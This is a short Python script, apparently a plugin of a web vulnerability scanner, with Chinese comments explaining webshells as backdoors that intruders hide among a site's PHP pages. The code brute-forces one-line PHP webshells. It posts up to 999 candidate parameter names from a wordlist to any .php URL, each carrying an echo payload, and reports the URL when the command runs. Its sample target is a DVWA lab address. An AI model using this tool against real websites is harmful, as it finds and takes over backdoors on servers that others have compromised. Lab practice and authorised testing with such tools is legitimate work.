# webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。
# 黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，
# 然后就可以使用浏览器来访问asp或者php后门，
# 得到一个命令执行环境，以达到控制网站服务器的目的。
# getshell 取得权限
import os
import sys
from lib.download import Downloader
import time

filename = os.path.join(sys.path[0], "data", "web_shell.txt")
payloads = []
f = open(filename)
a = 0
for i in f:
    payloads.append(i.strip())
    a += 1
    if a == 999:
        break
  # 对每个.php结尾的文件进行一句话爆破


def run(url, flag=0, loginUrl='', loginData=''):
    if not url.endswith(".php"):
        return False
    download = Downloader(flag, loginUrl=loginUrl, loginData=loginData)
    post_data = {}
    now = time.time()
    for payload in payloads:
        post_data[payload] = 'echo "password is {}";'.format(now)

# 变量=echo “ok”;
# 如果这个变量等于密码的时候，我们的语句就会被传参带入执行，那如果我们批量提交(即a=echo “ok”;&b=echo “ok”;&c=echo “ok”;&….)呢
# 只要我们提交的参数中含有实际的参数，就可被接收。
    r = download.post(url, post_data)

    if str(now) in r:
        return url
    return False


if __name__ == '__main__':
    run('http://192.168.220.132/dvwa/vulnerabilities/fi/?page=include.php', 1)